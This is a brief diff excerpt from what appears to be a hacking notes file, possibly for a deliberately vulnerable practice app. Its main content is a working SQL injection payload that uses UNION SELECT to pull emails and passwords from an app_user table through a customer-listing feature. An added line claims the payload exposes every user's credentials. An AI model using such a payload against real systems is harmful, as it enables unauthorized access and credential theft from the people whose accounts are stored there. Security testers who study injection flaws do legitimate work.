@@ -7,6 +7,7 @@ hacking
 
 2. using your print all custumers:
     %' UNION SELECT 1,email,password,4 FROM app_user' --
+    you wiil see all password and user in the system
 
 
 3. when add new costumer:
